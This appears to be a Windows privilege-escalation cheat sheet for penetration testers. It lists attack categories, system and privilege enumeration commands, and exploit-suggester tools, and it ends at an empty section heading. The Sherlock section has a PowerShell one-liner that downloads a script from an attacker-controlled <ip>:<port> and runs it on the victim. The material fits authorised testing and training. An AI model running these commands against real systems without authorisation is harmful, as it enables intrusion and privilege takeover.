# Win_Priv_Esc_Method
Windows Privilege Escalation Methodology

# Categories
* Stored Credentials
* Windows Kernel Exploit
* Applications/Drivers Exploits
* DLL Injection
* Unattended Answer File
* Insecure File/Folder Permissions
* Insecure Service Permissions
* DLL Hijacking
* Group Policy Preferences
* Unquoted Service Path
* Always Install Elevated
* Token Manipulation
* Insecure Registry Permissions
* Autologon User Credential
* User Account Control (UAC) Bypass
* Insecure Named Pipes Permissions

## General
* systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
* WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors

* whoami
* whoami /priv
  * SeDebugPrivilege
  * SeRestorePrivilege
  * SeBackupPrivilege
  * SeTakeOwnershipPrivilege
  * SeTcbPrivilege
  * SeCreateToken Privilege
  * SeLoadDriver Privilege
  * SeImpersonate & SeAssignPrimaryToken Priv.

* whoami /groups

* net user
* net user <user>

* netstat -ano
* ipconfig /all
* route print

* tasklist /SVC > tasks.txt
* schtasks /query /fo LIST /v > schedule.txt

* netsh advfirewall show currentprofile
* netsh advfirewall firewall show rule name=all


* wmic product get name, version, vendor > apps_versions.txt
* DRIVERQUERY
* mountvol

* accesschk-2008-vista.exe /accepteula
* accesschk-2008-vista.exe -uws "Everyone" "C:\Program Files"

* reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
* reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

## Windows Kernel Exploits
* systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Processor(s)" /C:"System Locale" /C:"Input Locale" /C:"Domain" /C:"Hotfix(s)"
  * searchsploit 
  * google

* WMIC CPU Get DeviceID,NumberOfCores,NumberOfLogicalProcessors

* Windows-Exploit-Suggester
  * python windows-exploit-suggester.py --database 2020-08-09-mssb.xls --systeminfo grandpa.txt

* Serlock
  * Config: Add to the last line the "Find-AllVulns"
  * Download and run Sherlock:
     * echo IEX(New-Object Net.WebClient).DownloadString('http://<ip>:<port>/Sherlock.ps1') | powershell -noprofile -

* Watson
  * Find .NET latest version of victim:
     * dir %windir%\Microsoft.NET\Framework /AD     
   * Fow older than windows 10 download zip version of watson v.1: https://github.com/rasta-mouse/Watson/tree/486ff207270e4f4cadc94ddebfce1121ae7b5437
   * Build exe to visual studio

## Applications/Drivers Exploits
* wmic product get name, version, vendor > install_apps.txt
  * searchsploit
  * google

* driverquery /v > drivers.txt
* powershell: driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', 'Path'
* powershell and specific word: Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
  * searchsploit
  * google
  

## Insecure File/Folder Permissions
